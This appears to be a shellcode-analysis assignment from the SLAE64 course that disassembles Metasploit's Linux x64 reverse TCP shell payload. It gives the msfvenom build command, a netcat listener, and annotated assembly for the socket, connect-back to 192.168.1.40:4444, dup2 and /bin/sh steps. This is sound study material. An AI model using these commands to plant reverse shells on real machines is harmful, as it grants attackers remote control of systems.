@@ -1,0 +1,117 @@
+Assignment#5-shellcode2
+
+Author : SLAE64-PA-6470 (kahlon81)
+
+Analysis of linux/x64/shell_reverse_tcp
+
+msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp -f elf > shell_reverse_tcp
+
+Usage :
+
+Pentester :
+nc -nlvp 4444
+
+Target :
+chmod +x shell_reverse_tcp 
+./shell_reverse_tcp 
+
+>>> Debug with gdb
+
+gdb ./shell_reverse_tcp
+break *0x400078
+set disassembly-flavor intel
+run
+layout asm
+layout regs
+
+Analysis :
+
+1) Open a socket stream
+
+B+>│0x400078        push   0x29                                                                                                                      
+   │0x40007a        pop    rax                                                                                                                       
+   │0x40007b        cdq                                                                                                                              
+   │0x40007c        push   0x2                                                                                                                      
+   │0x40007e        pop    rdi                                                                                                                       
+   │0x40007f        push   0x1                                                                                                                       
+   │0x400081        pop    rsi                                                                                                                       
+   │0x400082        syscall  
+
+sys_socket (rax = 0x29) int family (rdi = 0x02)  int type (rsi = 0x01)  int protocol (rdx = 0x00)
+
+2) Connect socket to port 4444 on localhost
+
+   │0x400084        xchg   rdi,rax                                                                                                                   
+   │0x400086        movabs rcx,0x2801a8c05c110002                                                                                                    
+   │0x400090        push   rcx                                                                                                                       
+   │0x400091        mov    rsi,rsp                                                                                                                   
+   │0x400094        push   0x10                                                                                                                      
+   │0x400096        pop    rdx                                                                                                                       
+   │0x400097        push   0x2a                                                                                                                      
+   │0x400099        pop    rax                                                                                                                       
+   │0x40009a        syscall 
+
+
+  │0x400084        xchg   rdi,rax  
+
+Keep socket stream fd
+
+   │0x400086        movabs rcx,0x2801a8c05c110002                                                                                                    
+   │0x400090        push   rcx                                                                                                                       
+   │0x400091        mov    rsi,rsp                                                                                                                   
+
+rsi points to stack with C structure :
+
+struct sockaddr_in {
+   uint8_t         sin_len;       /* total length      */
+   sa_family_t     sin_family;    /* family : AF_INET  */
+   in_port_t       sin_port;      /* port number       */
+   struct in_addr  sin_addr;      /* inet address      */
+   unsigned char   sin_zero[8];   /* 8 zeros           */
+};
+ 
+sin_family = 2 = AF_INET 
+sin_port = 4444 (0x5c11 is little endian version of 0x115c = 4444)
+sin_addr = 2801a8c0 = 192.168.1.40 in reverse order
+
+   │0x400094        push   0x10                                                                                                                      
+   │0x400096        pop    rdx 
+
+Put addrlen on stack
+
+   │0x400097        push   0x2a                                                                                                                      
+   │0x400099        pop    rax                                                                                                                       
+   │0x40009a        syscall 
+
+sys_connect (rax = 0x2a) int fd (rdi = rax = socket stream)  struct sockaddr *uservaddr (rsi) int addrlen (rdx = 0x10)
+
+
+3) Duplicate socket (stdin, stout, stderr)
+
+   │0x40009c        push   0x3                                                                                                                       
+   │0x40009e        pop    rsi                                                                                                                       
+   │0x40009f        dec    rsi                                                                                                                       
+   │0x4000a2        push   0x21                                                                                                                      
+   │0x4000a4        pop    rax                                                                                                                       
+   │0x4000a5        syscall 
+
+sys_dup2 (rax = 33) unsigned int oldfd  unsigned int newfd  
+
+4) Shellcode
+
+Call to sys_execve (rax = 59) const char *filename  const char *const argv[]  const char *
+
+Execute /bin/sh which is hs/nib/ in little endian or 0x68732f6e69622f in hexa
+
+   │0x4000a7        jne    0x40009f                                                                                                                  
+   │0x4000a9        push   0x3b                                                                                                                      
+   │0x4000ab        pop    rax                                                                                                                       
+   │0x4000ac        cdq                                                                                                                              
+   │0x4000ad        movabs rbx,0x68732f6e69622f                                                                                                      
+   │0x4000b7        push   rbx                                                                                                                       
+   │0x4000b8        mov    rdi,rsp                                                                                                                   
+   │0x4000bb        push   rdx                                                                                                                       
+   │0x4000bc        push   rdi                                                                                                                       
+   │0x4000bd        mov    rsi,rsp                                                                                                                   
+   │0x4000c0        syscall 
+
